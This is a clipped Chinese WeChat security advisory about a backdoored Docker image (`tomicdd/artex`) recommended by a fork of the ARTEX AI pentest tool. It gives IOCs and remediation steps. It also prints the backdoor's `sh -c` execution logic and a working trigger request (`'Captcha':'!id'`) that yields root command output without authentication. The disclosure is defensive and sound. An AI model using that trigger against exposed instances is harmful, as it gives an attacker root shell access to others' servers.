---
title: 【微信】谨慎使用！ ARTEX 二开投毒：流行 Fork 的 Docker 镜像植入未认证 WebShell
source: https://mp.weixin.qq.com/s/1kXJCYK6EmswaPdEUYyeeQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-04T11:54:16+08:00
trace_id: 97a5ad93-4cd1-4074-b752-63f04ac7b4a0
content_hash: df3fe20707c60d93a9f0b64272cbc56141a1f46d1ff7bd36769e94503db5d700
status: synced
tags:
  - 微信
  - 供应链投毒
  - WebShell
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 流行 Fork trhhubsd/ARTEX 推荐的 Docker 镜像 `tomicdd/artex` 被植入后门，登录接口发送 `!` 开头字段即可免认证以 root 执行任意命令。
ai_summary_style: key-points
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 40e75244-d011-8178-8a76-c16693397018
ioc:
  cves: []
  cwes: []
  hashes:
    - ce85d8369ccc1a85423f1f75d2f3afaa2fab759e580da37a6891af2f7392745e
    - d5070f52262effe216b840711343bff8f2787f39208d887d8dfd9c673f8d1573
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 流行 Fork trhhubsd/ARTEX 推荐的 Docker 镜像 `tomicdd/artex` 被植入后门，登录接口发送 `!` 开头字段即可免认证以 root 执行任意命令。
> 
> - **触发条件：** 向 `/api/auth/login` 发送 `Captcha` 值以 `!` 开头的请求，后门剥离 `!` 后经 `sh -c` 执行剩余内容并回显输出，跳过用户名与 bcrypt 密码校验直接返回 HTTP 200，等效未认证 root WebShell。
> - **投毒手法：** commit `a4f4d38` 仅篡改 docker-compose.yml，将镜像从 `autumn27/artex` 换为 `tomicdd/artex`；该 Docker Hub 账号 2026-10-08 注册后约 1 小时推送镜像，已被拉取约 7,954 次。
> - **隐蔽性：** 镜像 Go 构建元数据伪装为官方 `Autumn-27/artex` v0.3.16，但可见源码（v0.3.15 的 auth.go）中不存在 `captcha` 字段与 `verifyCaptcha` 函数，后门仅存在于预构建镜像，属典型镜像供应链攻击。
> - **背景：** ARTEX 原上游 2026 年 10 月因被 Storm-0940、VAPOR PANDA 等现实攻击滥用而下架停维护，trhhubsd/ARTEX（约 1–2k stars）成为流通较广的 Fork，README 仍推荐 Docker Compose 安装。
> - **处置建议：** 立即停用该仓库及 Docker 部署；已部署者停容器、删除镜像与数据卷并排查主机持久化；改用源码本地构建，校验镜像 digest（如 `sha256:ce85d8...2745e`）、限制管理端口网络暴露。

**李白你好** *2026年11月4日 10:26*

## 背景

ARTEX 是一套基于 Go 后端 + Next.js 前端 + PostgreSQL 的多 Agent LLM 驱动自主渗透测试系统，由 Autumn-27 开发，曾获百度 agent+ 攻防挑战赛冠军。系统支持规划器与 Worker 共享资产图与探索图，具备人在回路审批与完整流量记录能力。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0a2be9f0f2cf7a95.png)

2026 年 10 月，因工具被现实攻击滥用（包括微软关联的 Storm-0940、CrowdStrike 追踪的 VAPOR PANDA 等活动，涉及韩国金融机构、多国政府部门等），原作者将上游仓库下架并停止维护。此后多个 Fork 与镜像版本继续流通。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8514a96e53a3334f.png)

其中 **trhhubsd/ARTEX** （GitHub 约 1–2k stars）成为较受关注的 Fork。其 README 明确推荐 Docker Compose 安装，并指定拉取 `tomicdd/artex` 镜像。

## 后门发现与确认证据

2026 年 11 月 3–4 日，安全研究者在 X 与 GitHub Issue 中公开该仓库存在活跃后门，明确警告“不要尝试克隆它”。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fa9740264f439723.png)

关键证据（来自 Issue #7 的详细分析）：

-   **docker-compose.yml 被篡改**：commit `a4f4d38c7b60f68abbda574aa59188063f2d86c` （仅修改该文件）将镜像从原始 `autumn27/artex:${ARTEX_TAG:-latest}` 改为 `tomicdd/artex:${ARTEX_TAG:-latest}` 。
    
-   Docker Hub 账号 `tomicdd` 于 2026-10-08 18:50 UTC 注册，镜像于同日约 19:41 UTC 推送，与仓库修改时间高度吻合。截至检查时该镜像已被拉取约 **7,954** 次。
    
-   镜像 digest： `sha256:ce85d8369ccc1a85423f1f75d2f3afaa2fab759e580da37a6891af2f7392745e` 。
    
-   镜像内 `/app/artex` 二进制 digest： `sha256:d5070f52262effe216b840711343bff8f2787f39208d887d8dfd9c673f8d1573` 。
    
-   镜像 Go 构建元数据声称来自 `github.com/Autumn-27/artex` v0.3.16，但可见源码镜像（如 commit `e6ec569` v0.3.15）的 `auth.go` 中 **不存在** `captcha` 字段与 `verifyCaptcha` 函数。后门仅存在于预构建镜像中。
    

## 后门精确行为

登录接口 `/api/auth/login` 的处理逻辑被植入额外字段：

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a0c2b3b33cd3817b.png)

1.  读取请求 JSON 中的 `captcha` 字段。
    
2.  若首字节为 `!`，则剥离 `!` 后将剩余内容传入 `verifyCaptcha` 。
    
3.  `verifyCaptcha` 执行：
    

```
os/exec.Command("sh", "-c", <remainder>).CombinedOutput()
```

并返回 stdout + stderr 组合输出。 4. **在用户名/密码校验之前**，直接返回 HTTP 200，响应体形如：

```json
{"captcha": "<命令输出>", "error": "..."}
```

5.  正常认证路径（用户名校验、bcrypt 密码检查）在后门触发时被跳过。
    

因此，向 `/api/auth/login` 发送 `Captcha` 值以 `!` 开头的请求，即构成 **未认证 WebShell** （以 root 权限执行任意 shell 命令并回显输出）。

## 验证示例

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e84315518aa3a77f.jpg)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/1faffc9672fc6c5f.jpg)

正常登录失败响应（401）：

```json
{"error":"用户名或密码错误"}
```

后门触发请求示例：

```json
{"username":"x","password":"y","Captcha":"!id"}
```

响应：

```json
{"captcha":"uid=0(root) gid=0(root) groups=0(root)\n"}
```

该行为已在公开分析中复现确认。

## 影响与供应链启示

-   任何按官方 README 使用 `docker compose up -d` 部署 `trhhubsd/ARTEX` 的实例，均会拉取并运行含后门的 `tomicdd/artex` 镜像。
    
-   源码本身看似“干净”（无 `verifyCaptcha` ），攻击者通过替换预构建镜像实现隐蔽植入，属于典型的 **镜像供应链攻击**。
    
-   ARTEX 本身作为渗透工具已被恶意利用，此次在流行 Fork 中再植入后门，进一步放大了风险。
    

## 处置建议

1.  **立即停止使用** `trhhubsd/ARTEX` 仓库及其推荐的 Docker 部署方式。
    
2.  若已部署，立即停容器、删除相关镜像与数据卷，检查主机是否被植入持久化后门或被横向移动。
    
3.  优先使用可审计的源码本地构建，或选择经过独立验证的维护分支（注意原上游已下架，需自行验证完整性）。
    
4.  对任何安全工具的 Docker 镜像进行镜像 digest 校验、二进制与源码对比，并限制网络暴露（尤其是管理端口）。
    

此类事件再次说明：即使源码公开，预构建制品（Docker 镜像、二进制 Release）仍是供应链攻击的高价值目标。安全工具本身更应接受更严格的供应链审计。

**参考来源**：trhhubsd/ARTEX 仓库及 Issue、Docker Hub `tomicdd/artex` 、公开 Twitter 分析与研究者验证。

## 网络安全情报攻防站

**www.libaisec.com**

**综合性的技术交流与资源共享社区**

**专注于红蓝对抗、攻防渗透、威胁情报、安全资讯**

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/865c4f8b05786088.jpg)

> 👇 点击阅读原文，访问网络安全情报攻防站

AI · 目录
